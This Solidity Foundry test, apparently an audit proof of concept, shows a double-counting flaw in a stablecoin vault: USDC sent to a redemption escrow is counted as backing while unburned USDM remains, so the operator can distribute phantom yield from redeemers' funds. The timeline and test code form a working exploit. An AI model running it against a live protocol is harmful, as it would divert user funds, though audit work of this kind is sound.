// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ATTACK TIMELINE:
// 1. [Setup] Harness deploys protocol. We fund vault with USDC and mint USDM to user1.
// 2. [T=0] user1 requests redemption of 100,000 USDM. Vault calls addObligation on RedeemEscrow. USDM is held in Vault, not burned.
// 3. [T=1] Operator calls fundRedemptions(100,000 USDC). Vault transfers USDC to RedeemEscrow. Escrow balance = 100k, shortfall = 0.
// 4. [T=2] Accountant.totalBackingSigned() counts escrow's 100k USDC as backing. USDM totalSupply is unchanged (still in Vault). Surplus is artificially inflated by 100k.
// 5. [T=3] Operator calls settleDailyPnL(100,000). Gate 3 passes because distributableSurplus is inflated. Yield is distributed from USDC that is obligated to redeemers.
// 6. [Assert] Verify accountant.totalSettledYield() increased by the phantom yield amount, proving the double-counting exploit.

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/RedeemEscrow.sol";
import "../src/tokens/USDM.sol";

contract AuditAgentPoC is ToL1WeiHarness {
    function test_exploit() public {
        uint256 amount = 100_000e6;

        // 1. Setup: Fund vault with USDC and mint USDM to user1
        vm.startPrank(address(vault));
        usdc.mint(address(vault), amount);
        usdm.mint(user1, amount);
        vm.stopPrank();

        // 2. User requests redemption
        vm.startPrank(user1);
        usdm.approve(address(vault), amount);
        vault.requestRedeem(amount);
        vm.stopPrank();

        // 3. Operator funds redemptions (transfers USDC to RedeemEscrow)
        vm.prank(operator);
        vault.fundRedemptions(amount);

        // 4. Check inflated surplus
        int256 inflatedSurplus = accountant.distributableSurplus();
        assertGe(inflatedSurplus, int256(amount), "Surplus should be inflated by redemption amount due to double-counting");

        // 5. Operator settles daily PnL with the phantom yield
        uint256 settledYieldBefore = accountant.totalSettledYield();

        vm.prank(operator);
        vault.settle(amount);

        // 6. Assert that the phantom yield was successfully distributed
        uint256 settledYieldAfter = accountant.totalSettledYield();
        assertGt(settledYieldAfter, settledYieldBefore, "Phantom yield was distributed from escrow funds");
    }
}
